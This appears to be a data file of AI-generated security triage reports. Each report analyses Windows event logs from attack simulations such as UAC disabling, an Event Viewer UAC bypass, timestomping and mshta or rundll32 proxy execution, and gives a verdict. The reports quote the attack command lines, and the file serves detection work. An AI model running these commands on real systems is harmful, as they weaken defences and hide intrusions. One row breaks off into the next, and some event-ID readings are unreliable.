2. **Areas to Watch**: While many of the actions could be routine admin-related tasks (like the registry change), there's no overt evidence of malicious activity like unexpected privilege escalation, data exfiltration, or unexpected network connections.
3. **Guidance**: Regular audit and monitoring are recommended, along with identifying if there's any unexpected change in user behavior or with administrative tasks being reported or documented.

**Resolution: BENIGN**

Based on the patterns observed, there is no conclusive evidence suggesting the logs contain malicious activity. The activity primarily corresponds to system updates and maintenance tasks typical for Windows environments."
Rundll32 execute payload by calling RouteTheCall,"After analyzing the provided logs, here's the detailed assessment:

### PowerShell Logs

The PowerShell logs show multiple events with the command line invoking `powershell.exe` with a command to execute `rundll32.exe` targeting the `zipfldr.dll` with a route to launch `calc.exe`. The use of `rundll32.exe` in this manner is often suspicious, especially when paired with a PowerShell script, as it is commonly used for evading detection by launching arbitrary executables through a DLL call. Launching the calculator application (`calc.exe`) may appear benign, yet given the context and method used, this indicates potential malicious activity or script testing.

### System Logs

The system logs mainly reflect routine system activities such as time synchronization via the time service. There is no unusual system behavior or process running patterns that would suggest a compromise.

### Application Logs

The application logs show a typical stop of a service related to Microsoft Edge Update. This behavior is expected and does not indicate suspicious activity.

### Security Logs

The security logs indicate a time change event, a common operation tied to regular time synchronization, shown by svchost.exe, which typically hosts system services. This appears routine.

### Sysmon Logs

- Multiple entries show the use of system utilities such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe`. These entries show process execution but are often benign and regular within Windows environments.

- The most conspicuous detail in the Sysmon logs is the `rundll32.exe` image being executed with the same command line as indicated in the PowerShell logs:
   `""C:\\Windows\\system32\\rundll32.exe"" zipfldr.dll,RouteTheCall '%%windir%%\\System32\\calc.exe'`. This duplication confirms the activity observed in the PowerShell logs and enhances suspicions regarding this command's intent.

- The high integrity level and the use of `rundll32.exe` in conjunction with PowerShell can suggest attempts to elevate privileges or circumvent conventional security controls.

### Assessment and Recommendations

Upon reviewing these events, the standout indicator is the repeated use of `powershell.exe` to execute `rundll32.exe`, a proxy often used in lateral movement or malicious execution scenarios.

**Resolution: SUSPICIOUS**

Though launching `calc.exe` alone is harmless, the methodology observed here is unusual and potentially indicative of exploration or crafting a payload for execution via PowerShell scripts. This activity warrants further investigation:

- Conduct an audit of the admin accounts on `Server002` to check for any unauthorized access or account misuse.

- Review network activity and additional system logs surrounding these events to determine any correlated suspicious behavior or anomalies.

- Consider implementing monitoring or endpoint detection and response (EDR) solutions that can capture these types of activities in real time to mitigate potential risks in the future.

Follow up with deeper forensic investigation to ensure there are no other unnoticed attack vectors or lingering threats."
Mimic Ransomware - Allow Multiple RDP Sessions per User,"Based on the Sysmon, System, Security, and Application logs, here is an analysis of the events in question:

### Sysmon Log Analysis
1. **Process Executions:**
   - Multiple redundant executions of `wevtutil.exe` and `conhost.exe` are observed:
     - `wevtutil.exe` is a legitimate Windows utility used for managing event logs. 
     - `conhost.exe` is associated with command-line interfaces and console windows.
   - `hostname.exe` and `whoami.exe` executions are typical and used to query system information and user identity, respectively.
   - `cmd.exe` and `reg.exe` are executed to modify registry settings related to terminal services:
     - Command executed: `""cmd.exe"" /c reg add ""HKLM\\System\\CurrentControlSet\\Control\\Terminal Server"" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f`
     - This command alters terminal service settings to allow multiple sessions per user, which could indicate a configuration change for legitimate purposes but should be reviewed for context.

2. **Integrity Levels and User Context:**
   - Actions are taken with `High` integrity levels by the user `SERVER002\\admin_test`.
   - This indicates administrative privileges were used and the `admin_test` account is likely adequately privileged.

### System and Security Log Analysis
1. **Time Change Events:**
   - Notable System and Security events indicate the system time was altered:
     - Change from `2024-10-24 16:56:14.7117102` to `2024-10-24 16:56:11.1450737`.
   - Security Event ID 4616 documents a time change initiated by `svchost.exe`, which corresponds with a typical time service update using `time.windows.com`.

2. **Logon Events:**
   - Security Log Event ID 4624 (Logon) indicates a successful logon for `admin_test` via NTLM with Network logon type (Logon Type 3), suggesting it's a remote connection.
   - Event ID 4672 notes special privileges for `admin_test`, consistent with administrative actions.

### Application Log Analysis
- `sppsvc.exe` relating to the Software Protection Platform is seen, which is standard in checking activation and licensing statuses.

### Assessment
- The series of events primarily reflects administrative activities on `Server002`:
  - `wevtutil.exe` and `conhost.exe` activities suggest event log processing or maintenance.
  - The registry modification via `cmd.exe` and `reg.exe` indicates changes, potentially adjusting user session configurations.
- The presence of high integrity-level tasks and concurrent security log entries show actions performed by `admin_test`, indicating authorized administrative tasks.
- Time synchronization activities match with regular Windows operations.

### Conclusion
Based on the events above, the logs show typical behavior for a system under administrative control with no definitive indicators of malicious activity. However, the registry change concerning terminal server sessions should be verified for intent, as it could aid in malicious persistence by allowing multiple remote sessions.

Given the information provided:
- **Resolution: SUSPICIOUS** - While the overall activities appear standard, the registry modification and its potential implications warrant further scrutiny to ensure it aligns with expected administrative practices and doesn't open vulnerabilities unintentionally. Further investigation should confirm the legitimacy of the administrative actions and registry changes."
CheckIfInstallable method call,"### Analysis of Windows Event Logs

After thoroughly examining the provided Windows event logs, I have identified several points of interest that may indicate suspicious or potentially malicious activity. Here’s a detailed analysis:

1. **PowerShell Execution with Custom Scripts**: 
   - **Sysmon Log Entries**: The execution of PowerShell (`powershell.exe`) with a script located in `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.004\src\InstallUtilTestHarness.ps1` is noteworthy. This script further involves creating an assembly (`data.004.dll`) which is unusual and could suggest an attempt at executing arbitrary code.
   - **Command-Line Arguments and Execution Context**: The PowerShell script is running with high integrity level and the command is complex and indicative of potential script-based attacks often seen in living-off-the-land binaries (LOLbins).
   - **PowerShell Event Logs**: The logs suggest that there is a dynamic creation and execution of .NET assemblies, which is a common technique used by malware for persistence or obfuscation.

2. **Use of Diagnostic Utilities**:
   - **Processes Executed**: The use of `whoami.exe`, `svchost.exe`, and other system utilities in rapid succession could be indicative of enumeration attempts or unauthorized administrative activities.

3. **Microsoft Edge Update Processes**:
   - **Repeated Edge Update Executions**: Multiple processes related to Microsoft Edge Update are spawning from temporary directories (`C:\\Program Files (x86)\\Microsoft\\Temp\\EUDFF6.tmp\\MicrosoftEdgeUpdate.exe`). While these can be normal under typical update scenarios, their frequency, and the use of temporary directories merit further investigation to rule out potential misuse for malicious activities.

4. **Compilation Activities**:
   - **.NET Compiler Execution**: The usage of the .NET Framework compiler (`csc.exe`) is logged in the context of executing the PowerShell script, suggesting an attempt to compile and possibly execute .NET code dynamically.

### Assessment
Based on this analysis, there are several indicators that suggest suspicious activity:
- **Script Execution**: The sophisticated PowerShell script execution combined with dynamic DLL creation can potentially signify a compromise or malicious intent.
- **Temporary Directory Executions**: Execution of processes from unusual temporary directories could be covering tracks or evading detection by traditional security controls.

### Recommendation and Resolution
- **Conduct a deeper investigation** into the purpose and origin of the PowerShell script and any resulting files or executables created during its execution.
- **Check systems for unauthorized changes** or exposures that could have resulted from the executed code, particularly focusing on the modifications to system settings or installations.
- **Monitor for unusual activities** by the admin and consider enhanced auditing for future activities.

Given this analysis, I classify the log activities as **SUSPICIOUS**. There are strong indications of potentially malicious actions that require further investigation to confirm the intent and extent of any potential breach."
Allow SMB and RDP on Microsoft Defender Firewall,"Upon reviewing the provided set of Windows event logs, we notice several key points that require attention:

1. **Process Execution and Anomalous Commands:**
   - **Command Execution:** There is a record of ""cmd.exe"" being executed with the command line `""cmd.exe"" /c netsh advfirewall firewall set rule group=\""remote desktop\"" new enable=Yes & netsh advfirewall firewall set rule group=\""file and printer sharing\"" new enable=Yes`. This indicates that firewall rules are being modified to enable remote desktop and file/printer sharing which can be a potential security risk if done without explicit need or approval.
   - **Unusual Use of Admin Account:** The user `SERVER002\\admin_test` is executing these commands, and this user is frequently seen spawning `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, and `cmd.exe`. The frequent initiation of system utilities could suggest scripted or automated tasks which need verification for legitimacy.
   - **Account Used:** All these commands are being run by an administrative test account (`admin_test`), which should not typically be used for regular operations or administrative tasks in a production environment. This could be indicative of unusual activity.

2. **Privilege Levels and Context:**
   - The processes `cmd.exe`, `HOSTNAME.EXE`, and `whoami.exe` are being run with high integrity, indicating the user has administrative privileges, enhancing the potential impact of a misuse.
   - `wsmprovhost.exe` is spawning critical processes, suggesting a background management operation or script execution.

3. **Firewall Configuration:**
   - Firewall rules were modified to open remote desktop and file/printer sharing, a technique sometimes used by malicious actors to gain persistent remote access or to spread through the network.

4. **Sysadmin-Specific Tools:**
   - Tools like `wevtutil.exe` and `conhost.exe` are typically legitimate but can be utilized for log management and console interactions, respectively. The volume of these processes' executions lacks corresponding log alteration commands, otherwise could suggest benign activity unless coupled with further malicious intent.

**Assessment:**
- **SUSPICIOUS:** The activity is not immediately confirming a compromise but it is not typical for an administrative user in a secure enterprise environment. The changes to firewall rules—especially enabling remote desktop and file sharing without clear context—raise significant concern. Coupled with the frequent running of diagnostic and system management commands, it warrants further investigation.

**Threats/Risks Identified:**
- The possibility of unauthorized remote access or lateral movement potential via enabled firewall rules.
- Possible scripting or malicious use of an administrative test account.

**Guidance:**
1. Perform user activity review for `SERVER002\\admin_test`.
2. Validate whether these command executions were part of a scheduled task or a deployment script.
3. Inspect the necessity for the firewall rule changes and ensure they're aligned with an authorized network policy change.
4. Monitor network activities related to remote desktop usage or file sharing following this event timeframe.
5. Ensure tighter control and auditing on test and administrative tooling accounts.

In conclusion, given the potential for security implications, this activity falls under **SUSPICIOUS** and requires further scrutiny to determine the context and validate the legitimacy of these actions."
attrib - Remove read-only attribute,"Based on the analysis of the provided Sysmon logs, several points stand out that require evaluation to determine the nature of the activities observed:

### Observations:
1. **Use of CMD and CONHOST Processes:**
   - Multiple instances of `cmd.exe` and `conhost.exe` are seen executing with high integrity levels, launching through a user account named `SERVER002\\admin_test`.
   - Commands executed involve creating directories and attribute manipulation (`attrib.exe`), which might be normal for certain batch operations or scripts.
   - The commands executed include basic file and directory operations such as creating directories, adding data to files, and altering file attributes.

2. **Execution of `wevtutil.exe`:**
   - `wevtutil.exe` is seen executing several times under the `admin_test` user. This utility is generally used to administer event logs on Windows and may indicate log manipulation or querying.
   - Frequent use of this utility without clear context can be suspicious, especially if there's potential for log clearing or tampering.

3. **Execution of `whoami.exe` and `hostname.exe`:**
   - `whoami.exe` and `hostname.exe` are executed, which, while not inherently suspicious, often feature in attack scripts or post-exploitation enumeration processes to gather system/user information.

4. **Microsoft Edge Updates:**
   - Many entries relate to Microsoft Edge Update processes running under the `NT AUTHORITY\SYSTEM` account with expected command-line arguments. 
   - These processes appear to be part of software updating operations, evidenced by command lines indicating registration (`/regsvc`, `/regserver`) and update checking.

5. **Absence of Critical Logs:**
   - No significant indicators from the System, Security, or PowerShell logs that provide additional context or evidence of a breach or attempted breach.
   
### Suspicious or Anomalous Behavior:
- The frequent, high-privilege command-line executions by `admin_test`, combined with file and attribute modifications, can be considered suspicious without context of business need or known administrative tasks.
- Frequent use of `wevtutil.exe` without context or documentation of such operations can be anomalous as it might relate to an attempt to tamper with or review event logs for malicious activity.
  
### Assessment:
- **BENIGN:** If the activities are documented administrative tasks or batch processes known to IT Operations.
- **SUSPICIOUS:** If there's no explanation for the usage of `cmd.exe` and associated tools like `attrib.exe` and `wevtutil.exe`.
- **MALICIOUS:** If combined with evidence from other logs showing unauthorized access, data exfiltration, or privilege escalation, although not immediately apparent from these logs alone.

### Resolution:
Given the current observation that some processes and applications were executed using high integrity levels under the guise of potentially administrative tasks, and without additional corroborating evidence of overtly malicious actions or outcomes, this behavior is marked as **SUSPICIOUS**. It requires further investigation to determine:
- Whether the actions taken by `admin_test` are in line with expected, documented administrative duties.
- Inspection of network logs, additional system logs, or forensic detail to determine if lateral movement or further attacks were staged from this host.

### Guidance on How to Proceed:
- **Validate Account Activity**: Verify if the `admin_test` account activity is legitimate and expected for the operations seen.
- **Review Job Schedules and Scripts**: Look for any related task scheduler entries or scripts that might explain the actions logged.
- **Cross-Reference Other Logs**: Investigate logs from associated network equipment or endpoints for signs of related suspicious activity.
- **Conduct Detailed Forensic Analysis**: If suspicion of compromise remains, a deeper forensic analysis of the endpoint may be required, including capturing memory and disk for examination."
Windows HideSCAVolume Group Policy Feature,"In analyzing the provided Windows event logs, the main areas to consider for potential malicious activity include unusual process executions, suspicious command-line arguments, and activities related to privilege escalations or system modifications. Here's a detailed breakdown based on the log entries:

### System Log
- **Time Reversion:** There are Windows Kernel-General events indicating a backward adjustment of system time (EventID: 24 and 1). It's essential to know whether this time change was authorized or expected, as suspicious time changes can sometimes be used to manipulate logs or confuse timestamp-based analysis.

### Sysmon Log
- **Process Executions by User 'admin_test':**
  - **Registry Change Commands:** There are entries showing `cmd.exe` being used to execute a registry change command via `reg.exe`:
    - Command: `""\""cmd.exe\"" /c reg add \""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\"" /v HideSCAVolume /t REG_DWORD /d 1 /f""`
    - This command attempts to modify an Explorer policy (HideSCAVolume), which could be critical, as modifying registry values related to system policies might be an attempt to hide certain volumes or components from users.

- **Services and Updates:**
  - **MicrosoftEdgeUpdate.exe and Its Associated Processes:** The logs include multiple executions of `MicrosoftEdgeUpdate.exe` and related processes, which appear legitimate and linked to Edge updating tasks. However, it is crucial to verify if these actions align with the standard update schedule and configuration.

### Application Log
- **Service Stopped Messages:** Found relating to `edgeupdate`, which seems consistent with expected behavior following an update or scheduled shutdown.

### Security Log
- **Privilege Assignments and Logon Activity:**
  - The `admin_test` user is involved in activities with high privileges (EventID: 4672 lists several sensitive privileges). This needs to be evaluated in the context of what this admin user is typically authorized to do.
  - A successful NTLM logon session establishment (EventID: 4624) was recorded, which appears legitimate but still requires context about the session origin.

### Assessment
Given the log context, I focus on a few critical observations:

1. **Registry Modification Using 'cmd.exe' and 'reg.exe':** This registry manipulation could be an attempt to hide system components or configurations. This behavior might be acceptable for certain administrative tasks but could be indicative of malicious intentions if unauthorized.

2. **Privilege Usage by 'admin_test':** High privilege use, especially with the specific privileges listed, can be significant if they aren't linked to sanctioned activities or regular administrative tasks.

3. **Time Change Events in System Logs:** Changing the system time on a server can be suspicious unless it was done for legitimate purposes, such as correcting time drift or sync with a time server. These actions should be vetted against authorized change management processes.

### Guidance and Conclusion
- **Resolution: SUSPICIOUS**

The activities, primarily the registry changes, alongside time adjustments and high privilege use, warrant further investigation. Verification against baseline activities, change logs, and possibly interviewing personnel or checking other monitoring tools for corroborative evidence is crucial. These steps will help determine if an escalation to 'malicious' is necessary or if the activities are eventually benigned.

Here’s how to proceed:
1. **Confirm if the registry change was part of an authorized admin task or a potential misconfiguration attempt.**
2. **Evaluate the system time change for legitimacy against known system or administrative procedures.**
3. **Conduct a review of `admin_test` activity logs, focusing on routines involving high privileges.**
4. **Cross-reference these logs with antivirus or endpoint detection systems to check for correlating anomalies.**

By addressing these areas, you can narrow down whether the activities captured in logs were authorized or represent a threat requiring mitigation."
Disable UAC using reg.exe,"Upon analysis of the provided Windows event logs, there are several aspects to consider:

1. **Repeated Edge Update Executions**: 
   - There are numerous entries related to the execution of `MicrosoftEdgeUpdate.exe`, which is associated with updating the Microsoft Edge browser. The presence of multiple processes and commands related to Edge Update is normal for systems where Edge is installed, as it frequently checks for updates.

2. **Service and Time Change Events**:
   - There are logs from the `Microsoft-Windows-Time-Service` and `Microsoft-Windows-Kernel-General` indicating time changes. These logs are typically normal, reflecting periodic synchronization with a time server, in this instance, `time.windows.com`.

3. **Command Executions with System Integrity Level**:
   - An event was noted where `cmd.exe` was used to execute a `reg.exe` command to modify a registry key related to User Account Control (UAC) settings (`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA`). This action is suspicious due to the following reasons:
     - The command is run with high integrity, indicating elevated privilege use.
     - Disabling UAC (`/d 0`) is a known tactic used by malicious actors to weaken system defenses and execute malicious scripts without user consent.

4. **Processes Executed by `admin_test` User**:
   - The `admin_test` user account executed several commands including `whoami.exe`, `cmd.exe`, and `reg.exe` which are typical in reconnaissance and configuration change within a system. The context in which they were executed raises suspicion, particularly changes to UAC.

5. **No Other Clear Malicious Indicators**:
   - Aside from the noted registry operation, no other entries stood out as clearly malicious. Most other processes like `MicrosoftEdgeUpdate.exe` and its related components are normal and expected.

**Assessment:**

- **SUSPICIOUS**: The event where the UAC setting was modified is suspicious and indicative of potential malicious intent, or at best, unsafe practice if done intentionally. This would typically merit further investigation to understand the intention behind altering UAC settings.
  
**Recommendations:**

- **Immediate Investigation**: Confirm the legitimacy of the `admin_test` account's actions. Determine if the account is regularly used and if these activities align with sanctioned administrative activities.
- **Review Security Policies**: Ensure strict policies regarding PowerShell and cmd.exe access, especially in environments requiring administrative rights.
- **Monitor for Further Actions**: Keep the system under close monitoring for further registry modifications or similarly suspicious activities, and ensure system defenses like UAC are restored to secure settings if altered without proper authorization.
- **Audit Logs**: Consider auditing logs for user account activities and administrative actions across other systems to see if similar patterns exist.

Given the information outlined, the activity marked as suspicious should be further investigated to affirm whether it aligns with legitimate administrative tasks or unintended security exposure."
UACME Bypass Method 61,"Based on the provided log data, we need to conduct a thorough analysis of any suspicious or potentially malicious activity.

Execute base64-encoded PowerShell from Windows Registry,"### Analysis

Upon reviewing the provided Windows event logs, several indicators stand out suggesting potential malicious activities:

#### Windows PowerShell Logs
- A series of PowerShell commands using base64 encoding to obfuscate the original commands were observed. Encoded commands are often used to hide malicious scripts in PowerShell activities. This technique is recognizable as an attempt to evade detection by traditional means, often indicating obfuscation for malicious purposes.
- The script attempts to set registry values using `Set-ItemProperty`, which can be associated with persistence mechanisms or attempts to alter system configurations without administrative visibility.
- Usage of `IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String(...)))` is a strong indicator for scripts executing dynamically decoded data, often a vector for executing unauthorized commands.

#### Sysmon Logs
- The multiple execution of legitimate Windows utilities such as `whoami.exe`, `conhost.exe`, and `wevtutil.exe` in close proximity could suggest an attempt to gather system information or manipulate log data, potentially indicative of unauthorized recon or cleanup activities.
- The execution of `WindowsPowerShell` nested with encoded command lines tying back to PowerShell events indicates suspicious command execution behavior, possibly aligning with exploitation or malicious script execution.

#### Security Logs
- Privilege escalation events (e.g., Event ID 4672 with elevated privilege tokens) can show attempts for unauthorized actions under SYSTEM or administrative accounts. This may indicate an attacker leveraging high privileges to perform actions or persist on the system.

### Assessment

Based on the analysis:
- The use of encoded PowerShell commands, common tools used for recon or further exploitation, along with high-integrity level access in the security logs suggest unauthorized activity.
- The combination of techniques (encoded PowerShell scripts, base64 obfuscation, registry manipulation, running system utilities with elevated privileges) is consistent with various stages of an attack lifecycle from initial exploitation, information gathering, to establishing persistence or execution of additional payloads.

### Resolution

**MALICIOUS**

### Recommendations

1. **Immediate Action**: Isolate the affected system (Server002) from the network to prevent further spread or data exfiltration.
2. **Further Investigation**: Conduct a deep forensic analysis to identify the scope of the intrusion, including memory analysis and persistence mechanisms.
3. **Remediation**: Remove malicious scripts, review and revert any unauthorized registry changes, and perform a full malware scan.
4. **Review and Harden**: Update all security systems, review group policies around scripting, and employ network segmentation where possible.
5. **Continuous Monitoring**: Enhance monitoring with alerting focused on encoded PowerShell commands and privilege escalation events in the SIEM environment.

Consider engaging with cybersecurity incident response specialists if needed and ensure all findings and actions are thoroughly documented."
Bypass UAC using Event Viewer (PowerShell),"Upon analyzing the log entries provided, multiple indicators suggest suspicious activity. Here's a detailed breakdown:

### Suspicious and Anomalous Behaviors:

1. **Process Execution and Command-Line Arguments:**
   - A `PowerShell.exe` process was executed with the following command:
     ```
     New-Item ""HKCU:\\software\\classes\\mscfile\\shell\\open\\command"" -Force
     Set-ItemProperty ""HKCU:\\software\\classes\\mscfile\\shell\\open\\command"" -Name ""(default)"" -Value ""C:\\Windows\\System32\\cmd.exe"" -Force
     Start-Process ""C:\\Windows\\System32\\eventvwr.msc""
     ```
   - This command sequence is a known technique for executing a process with elevated privileges by exploiting Windows' Event Viewer. The command modifies the registry to change the behavior of `.msc` files to execute `cmd.exe`, then triggers the Event Viewer to execute the command with administrative privileges unintentionally.

2. **Privilege Escalation Indicators:**
   - There is a series of logs where multiple processes (`wevtutil.exe`, `conhost.exe`) are executed by the user `SERVER002\admin_test`, which has high privileges. These are standard tools but may indicate attempts to interact with the event log service or console host windows, potentially for malicious purposes.

3. **Logon and Privilege Events:**
   - The user `admin_test` has multiple high-level privileges like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, among others, which might be exploited to carry out unauthorized actions on the system.

4. **Use of High Integrity Processes:**
   - The use of high integrity level settings in processes, such as with `HOSTNAME.EXE` and `whoami.exe`, implies actions performed at administrator levels frequently precede attack vector setups.

5. **Unusual Process Patterns:**
   - Rapid execution of multiple processes (`wevtutil.exe` in particular) within a short time might be related to log clearing or other administrative actions which bear investigation, considering these processes are typically manually triggered for administrative maintenance.

6. **Time Synchronization Events:**
   - Alterations in time, noted in Kernel-General logs, suggest system clocks may have been manipulated. This can sometimes obscure legitimate trace logs or coordinate timing for actions across multiple systems.

### Conclusion:

- **Resolution:** **SUSPICIOUS**
  
The logs exhibit a series of activities indicative of suspicious actions that are commonly associated with privilege escalation tactics used in post-exploitation stages of an intrusion. These findings warrant further investigation to rule out potential malicious activity.

### Guidance on How to Proceed:

1. **Review System Changes:**
   - Conduct a thorough check of any modifications made to user privileges, registry entries, and scheduled tasks.

2. **Analyze Network Traffic:**
   - Investigate any unusual outbound or inbound network communications around the same time as the logs.

3. **Forensic Collection:**
   - Preserve all logs, system snapshots, and any volatile data that may help in deeper forensic analysis.

4. **User Verification:**
   - Verify the legitimacy of the actions associated with the `admin_test` user, confirming whether they were expected behaviors from trusted internal actors.

5. **Execute Threat Hunting:**
   - Engage in proactive threat hunting across the infrastructure to identify if this behavior is isolated or indicates a broader campaign targeting your systems."
Mshta used to Execute PowerShell,"Upon reviewing the provided Windows event logs, I have identified a sequence of events that warrant detailed analysis:

1. **Repeated Usage of `wevtutil.exe` and `conhost.exe`**:
   - The logs show frequent execution of `wevtutil.exe` followed by `conhost.exe`. While these could be legitimate, such repeated executions can sometimes indicate attempts to manipulate event logs in attacks. The admin user `SERVER002\\admin_test` ran these commands, which isn't unusual in an administrative context but given the frequency, this should be verified for legitimacy.

2. **Unusual Use of PowerShell via MSHTA**:
   - A command invokes `cmd.exe` with a subsequent execution of `mshta.exe` utilizing VBScript to run `powershell.exe` with the argument `-nop -Command Write-Host Hello, MSHTA!`. This is highly suspicious as `mshta.exe` is often used in attacks for executing scripts without spawning a command prompt window. This specific use could be testing, but if it's unexpected, it might be malicious.

3. **Indicators of Time Tampering**:
   - The logs show discrepancies in time settings, where the system time is rolled back (from `2024-10-26T14:34:52.5` to `2024-10-26T14:34:45.5`). Time changes can be a red flag, especially in scenarios where attackers attempt to cover tracks by manipulating timestamps of logs.

4. **Privilege and User Analysis**:
   - The use of the `SERVER002\\admin_test` account for these operations is another layer to consider. If this account should not be executing these types of operations or is compromised, it could indicate suspicious behavior.

5. **Behavioral Pattern**:
   - The sequence and behavior of commands indicate potential script-based automation or script-kiddie style attacks, particularly using methods to execute commands while evading detection (`mshta.exe` running PowerShell).

**Assessment**:
- Given the usage of `mshta.exe` to execute PowerShell commands and the unusual time-related events, there is a strong suspicion of malicious activity. However, more context is needed to definitively categorize this as a cyber incident. Specifically:
  - Verification with system administrators regarding the use of `wevtutil.exe` and the purpose of these PowerShell commands.
  - Confirmation on whether there are legitimate processes or scripts performing these automated tasks.

**Resolution**: **SUSPICIOUS**

**Guidance on How to Proceed**:
- Conduct further investigation into the nature of the administrative actions around the timestamps of these events. Check for any scheduled tasks or automation scripts.
- Validate with stakeholders if the PowerShell commands are expected in their operational environment.
- Review account activity for `SERVER002\\admin_test` and ensure there is no unauthorized access or credential compromise.
- Ensure proper time synchronization settings and monitor for any unauthorized time changes. 
- Implement additional monitoring and alerting for similar actions to detect future occurrences swiftly."
Invoke HTML Application - Jscript Engine over Local UNC Simulating Lateral Movement,"Upon analyzing the provided Windows event logs, several entries exhibit behaviors that warrant further investigation. The logs contain indicators of potentially malicious activity, primarily focusing on suspicious PowerShell usage and the execution of unknown processes.

### Analysis:

1. **Suspicious PowerShell Activity:**
   - Multiple Sysmon events indicate the execution of `powershell.exe` running with high integrity and using atypical command lines:
     - The command `Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath $env:windir\\system32\\mshta.exe` is unusual and potentially malicious, as it involves script execution, lateral movement simulation, and usage of `mshta.exe`.
     - The use of PowerShell in such a context, especially when combined with constructs like `Invoke-ATHHTMLApplication`, is commonly associated with attempts to evade detection and execute scripts that could lead to compromise.

2. **Execution of SYSTEM utilities and console hosts:**
   - The frequent spawning of `wevtutil.exe` and `conhost.exe` processes are recorded. While these utilities can be legitimate, they are also often utilized by attackers to hide activities or perform reconnaissance.
   - For example, `wevtutil.exe` might be used to clear event logs to cover tracks or to query event logs for specifics.

3. **Use of High-Integrity Level Processes:**
   - The processes, including `powershell.exe` and `wevtutil.exe`, are running with a high integrity level, implying elevated privileges which could facilitate further exploitation if initiated by an unauthorized user.

4. **Command-line Arguments:**
   - The command-line argument observed in PowerShell activity also indicates the deliberate execution of scripts that may result in system manipulation or data exfiltration.

5. **Timeline and Repetitive Activity:**
   - The events occur within a very short timespan, indicating automation or scripted activity, which can be suggestive of malware or a malicious script being executed without user intervention.

### Assessment:

The patterns observed align with potentially malicious activities, particularly in terms of the PowerShell script execution attempting to leverage Windows infrastructure for possibly inappropriate activities. These scripts using tools like `mshta.exe` are frequently associated with red-teaming and attack simulations, indicating a high probability of compromise.

### Resolution: 
Based on the evidence and potential risk identified in the logs, the activity is classified as **MALICIOUS**.

   - Isolate the affected host (Server002) from the network to prevent further lateral movement and data exfiltration.
   - Initiate incident response protocols to contain and eradicate the threat.
   - Perform a comprehensive sweep for additional indicators of compromise across the network.

2. **Further Investigation:**
   - Analyze the PowerShell scripts and any associated files or scheduled tasks.
   - Audit all elevated privilege activities, especially around the time of these logs.
   - Review user activity for ""admin_test"" to verify legitimacy and access patterns.

3. **Mitigation:**
   - Implement stringent PowerShell monitoring and execution policies using tools like AppLocker or Windows Defender Application Control.
   - Ensure that all hosts are patched and up-to-date to prevent exploitation through known vulnerabilities.

4. **Post-Incident Steps:**
   - Conduct a full review of security controls to ensure they are capable of catching similar activities in the future.
   - Educate users on recognizing and reporting suspicious system behaviors promptly."
Compiled HTML Help Local Payload,"After analyzing the provided set of logs from Windows event logs (Security, Application, and Sysmon), several noteworthy observations can be made:

1. **Logon Events**:
   - **Security Log** - The event ID 4624 indicates a successful logon event. Regular logon types like '3' (Network) and '5' (Service) are visible, which are typical for server processes. However, User `admin_test` seems to have performed a logon using NTLM authentication from `DESKTOP-3HL5B2P`, which could indicate a typical administrative access, but should be confirmed as legitimate because network logons with admin accounts can be used in lateral movement by attackers.

2. **Privileged Access**:
   - **Event ID 4672** occurs when a user is assigned special privileges. User `admin_test` was granted a large set of privileges, including `SeTakeOwnershipPrivilege`, `SeDebugPrivilege`, and more. These privileges are significant and usually not needed for normal daily operations, suggesting the possibility of privilege escalation or sensitive activity. 

3. **Process Creations**:
   - **Sysmon Log** - Multiple instances of PowerShell (Event ID 5) run by `admin_test` are noted, which can be a red flag if there is no known legitimate activity around that time involving PowerShell. PowerShell is often used for administrative tasks, but it's also a common tool for attackers.
   - There's a `cmd.exe` execution with the command to open `hh.exe`, a help file reader, which might be used for later payload delivery or to hide malicious activities as `hh.exe` can be exploited to bypass security restrictions.
   - Multiple executions of Microsoft Edge Update executable processes (`MicrosoftEdgeUpdate.exe`) and related components are found. This could be part of normal system operations; however, if these aren't accounted for as part of scheduled updates, they should be reviewed.

4. **System Activity**:
   - **Application Log** - Windows Defender appears to be enabled, based on the SecurityCenter logs, which is a good sign. 
   - Edge Updates in the Sysmon logs are consistent and do not appear immediately suspicious unless Edge Update schedules do not align with this activity.

5. **General Observations**:
   - There are no explicit indications of a known malicious tool or script within the logs. However, the events involving high privileges and unconventional command-line usages raise suspicion and warrant further scrutiny.

### Assessment:
Given the details extracted from the logs, the situation leans towards ""SUSPICIOUS"" due to:
- Abundant privileges for `admin_test`.
- Use of PowerShell and cmd commands that may leverage unusual or unexpected activities.
- NTLM authentication from a different machine. Verify if these actions are part of legitimate administration or operations.

### Recommended Actions:
1. Confirm the legitimacy of user `admin_test`'s activities and verify with the admin team whether these commands and operations align with standard operating procedures.
2. Cross-reference system schedules for Microsoft Edge updates and confirmed scheduled administrative tasks.
3. Monitor for any further unusual activity involving PowerShell, as it has high potential for misuse.
4. Verify network connections and access patterns, specifically from `DESKTOP-3HL5B2P`, to ensure they're consistent with normal operations.
5. Review policies around privilege assignments and revocations to minimize exposure.

To confirm or dismiss the suspicion, further investigation through checking historical logs, endpoint behavior analytics, and direct inquiry with the involved parties should be pursued."
Windows - Modify file creation timestamp with PowerShell,"Based on the analysis of the provided logs, here's a detailed explanation of findings, highlighting any indicators of suspicious or malicious activity:

### Analysis:

1. **PowerShell Activity**:
   - There is a mention of PowerShell executing with a script intended to modify file creation timestamps: 
     ```plaintext
     powershell.exe & {Get-ChildItem ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\data.006_timestomp.txt"" | % { $_.CreationTime = ""01/01/1970 00:00:00"" }}
     ```
   - This activity is suspicious because timestomping (modifying file timestamps) is a common indicator of malicious activity, as it is often used by attackers to hide their tracks and make forensic analysis more difficult.

2. **Repeated Process Executions**:
   - There are multiple executions of common Windows utilities (e.g., `wevtutil.exe`, `conhost.exe`, `whoami.exe`) by an account named `admin_test`.
   - While the execution of these utilities is not inherently malicious, the pattern of these processes being executed rapidly in succession may indicate scripted or automated activity.

3. **Edge Update Activity**:
